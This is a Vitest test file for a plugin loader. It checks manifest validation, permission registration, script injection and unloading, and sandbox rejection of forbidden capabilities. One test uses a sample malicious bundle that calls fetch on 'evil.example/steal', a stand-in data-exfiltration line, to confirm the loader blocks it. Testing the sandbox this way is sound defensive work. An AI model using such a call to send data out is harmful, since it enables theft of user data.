import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

const ALL_PERMISSIONS = [
  'project:read',
  'project:write',
  'ui:menu',
  'ui:panel',
  'ui:toolbar',
  'ui:overlay',
  'ui:settings',
  'ui:context-menu',
  'ui:templates',
  'io:import',
  'io:export',
] as const;

const pluginApiMocks = vi.hoisted(() => ({
  installPluginApi: vi.fn(),
  setManifestPermissions: vi.fn(),
  unloadExternalPlugin: vi.fn(),
}));

vi.mock('./pluginApi', () => ({
  installPluginApi: pluginApiMocks.installPluginApi,
  setManifestPermissions: pluginApiMocks.setManifestPermissions,
  unloadExternalPlugin: pluginApiMocks.unloadExternalPlugin,
  ALL_PERMISSIONS,
}));

function createManifest(overrides: Record<string, unknown> = {}) {
  return {
    id: 'demo-plugin',
    name: 'Demo Plugin',
    version: '1.0.0',
    main: 'dist/plugin.js',
    permissions: ['ui:menu'],
    ...overrides,
  };
}

describe('pluginLoader', () => {
  let pluginLoader: Awaited<typeof import('./pluginLoader')>;
  let appendBehavior: 'load' | 'error';

  beforeEach(async () => {
    vi.resetModules();
    vi.clearAllMocks();
    vi.unstubAllGlobals();
    document.head.replaceChildren();
    appendBehavior = 'load';

    Object.defineProperty(URL, 'createObjectURL', {
      configurable: true,
      value: vi.fn(() => 'blob:plugin-loader'),
    });
    Object.defineProperty(URL, 'revokeObjectURL', {
      configurable: true,
      value: vi.fn(),
    });

    const originalAppendChild = document.head.appendChild.bind(document.head);
    vi.spyOn(document.head, 'appendChild').mockImplementation((node: Node) => {
      const appended = originalAppendChild(node);
      if (node instanceof HTMLScriptElement) {
        queueMicrotask(() => {
          if (appendBehavior === 'load') {
            node.onload?.call(node, new Event('load'));
          } else {
            node.onerror?.call(node, new Event('error'));
          }
        });
      }
      return appended;
    });

    pluginLoader = await import('./pluginLoader');
  });

  afterEach(() => {
    vi.restoreAllMocks();
    vi.unstubAllGlobals();
    document.head.replaceChildren();
  });

  it('validates a correct manifest', () => {
    expect(pluginLoader.validateManifest(createManifest())).toBeNull();
  });

  it('rejects malformed manifests', () => {
    expect(pluginLoader.validateManifest(null)).toBe('Manifest must be a JSON object');
    expect(pluginLoader.validateManifest(createManifest({ id: 'BadId' }))).toBe('Invalid plugin id: must be kebab-case');
    expect(pluginLoader.validateManifest(createManifest({ version: '1.0' }))).toBe("Invalid version '1.0': must be X.Y.Z");
    expect(pluginLoader.validateManifest(createManifest({ permissions: ['admin'] }))).toBe("Unknown permission: 'admin'");
  });

  it('loads a bundle, installs the API, and pre-registers manifest permissions', async () => {
    const manifest = createManifest({ id: 'demo-plugin', permissions: ['ui:menu', 'io:import'] });

    await pluginLoader.loadPluginBundle('demo-plugin', 'window.demo = true;', manifest);

    expect(pluginApiMocks.installPluginApi).toHaveBeenCalledOnce();
    expect(pluginApiMocks.setManifestPermissions).toHaveBeenCalledWith('demo-plugin', ['ui:menu', 'io:import']);
    expect(URL.createObjectURL).toHaveBeenCalledOnce();
    expect(URL.revokeObjectURL).toHaveBeenCalledWith('blob:plugin-loader');
    expect(document.head.querySelectorAll('script')).toHaveLength(1);

    pluginLoader.unloadPluginBundle('demo-plugin');
    expect(pluginApiMocks.unloadExternalPlugin).toHaveBeenCalledWith('demo-plugin');
    expect(document.head.querySelector('script')).toBeNull();
  });

  it('grants all permissions when no manifest is provided', async () => {
    await pluginLoader.loadPluginBundle('builtin-like', 'window.demo = true;');

    expect(pluginApiMocks.setManifestPermissions).toHaveBeenCalledWith('builtin-like', ALL_PERMISSIONS);
  });

  it('unloads a previous script before reloading the same plugin id', async () => {
    const manifest = createManifest({ id: 'reloadable-plugin' });

    await pluginLoader.loadPluginBundle('reloadable-plugin', 'window.first = true;', manifest);
    await pluginLoader.loadPluginBundle('reloadable-plugin', 'window.second = true;', manifest);

    expect(pluginApiMocks.unloadExternalPlugin).toHaveBeenCalledWith('reloadable-plugin');
    expect(document.head.querySelectorAll('script')).toHaveLength(1);
  });

  it('rejects invalid manifests before executing the bundle', async () => {
    await expect(
      pluginLoader.loadPluginBundle('broken-plugin', 'window.demo = true;', createManifest({ id: 'broken-plugin', permissions: ['nope'] })),
    ).rejects.toThrow("Invalid manifest for plugin 'broken-plugin': Unknown permission: 'nope'");

    expect(pluginApiMocks.installPluginApi).not.toHaveBeenCalled();
  });

  it('rejects an external bundle that uses forbidden capabilities before injecting it', async () => {
    const manifest = createManifest({ id: 'evil-plugin' });

    await expect(
      pluginLoader.loadPluginBundle('evil-plugin', 'fetch("https://evil.example/steal");', manifest),
    ).rejects.toThrow(/\[Sandbox\] Plugin 'evil-plugin'/);

    // The bundle must never reach the page or the permission pre-registration.
    expect(pluginApiMocks.installPluginApi).not.toHaveBeenCalled();
    expect(pluginApiMocks.setManifestPermissions).not.toHaveBeenCalled();
    expect(document.head.querySelector('script')).toBeNull();
  });

  it('does not sandbox-scan trusted built-in bundles loaded without a manifest', async () => {
    // No manifest → trusted path; even a "fetch" reference is allowed through.
    await expect(
      pluginLoader.loadPluginBundle('trusted-builtin', 'fetch("/internal");'),
    ).resolves.toBeUndefined();

    expect(pluginApiMocks.installPluginApi).toHaveBeenCalledOnce();
  });

  it('rejects when the bundle fails to execute', async () => {
    appendBehavior = 'error';

    await expect(
      pluginLoader.loadPluginBundle('broken-runtime', 'throw new Error("boom")'),
    ).rejects.toThrow('Failed to execute plugin bundle: broken-runtime');

    expect(URL.revokeObjectURL).toHaveBeenCalledWith('blob:plugin-loader');
  });
});
